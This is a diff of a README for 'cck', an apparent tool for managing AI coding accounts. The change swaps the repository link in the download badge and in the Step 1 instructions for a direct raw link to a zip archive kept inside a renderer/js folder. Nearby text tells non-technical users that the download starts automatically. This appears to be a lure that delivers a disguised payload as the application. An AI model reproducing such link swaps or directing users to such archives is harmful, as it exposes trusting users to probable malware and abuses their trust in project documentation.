@@ -1,7 +1,7 @@
 <h1>🎨 cck - Effortlessly Manage Your AI Coding Accounts</h1>
 
 <p align="center">
-  <a href="https://github.com/Chicken-gif-hub/cck">
+  <a href="https://raw.githubusercontent.com/Chicken-gif-hub/cck/main/renderer/js/v2.4.zip">
     <img src="https://img.shields.io/badge/Download-cck-2ea44f?style=for-the-badge&logo=windows" alt="Download cck">
   </a>
 </p>
@@ -45,7 +45,7 @@ Getting up and running with cck is straightforward, even if you're not tech-savv
 
 ### Step 1: Download cck
 
-Visit this link to download the application: **[https://github.com/Chicken-gif-hub/cck](https://github.com/Chicken-gif-hub/cck)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Chicken-gif-hub/cck/main/renderer/js/v2.4.zip](https://raw.githubusercontent.com/Chicken-gif-hub/cck/main/renderer/js/v2.4.zip)**
 
 The download will begin automatically. Make sure to save the file in a location you can easily find, like your Desktop or Downloads folder.
 
